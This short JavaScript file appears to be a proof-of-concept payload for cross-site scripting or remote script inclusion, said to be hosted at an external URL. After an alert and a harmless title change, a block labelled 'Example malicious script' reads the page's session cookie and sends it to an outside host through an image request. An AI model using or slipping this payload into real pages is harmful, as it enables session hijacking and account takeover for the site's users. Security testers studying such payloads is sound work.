// Assume this is the content of the file hosted at https://ex.am/m
console.log("Module loaded and executed!");
alert('any XSS is possible here')


// If you want to perform some specific function automatically, define and call it:
function updateDOM() {
  document.title = "Updated by Module";
}

// Call the function
updateDOM();

// Example malicious script to send the session cookie to an attacker's server
var sessionCookie = document.cookie;
var img = new Image();
img.src = "https://test.com/exfiltrate?cookie=" + encodeURIComponent(sessionCookie);
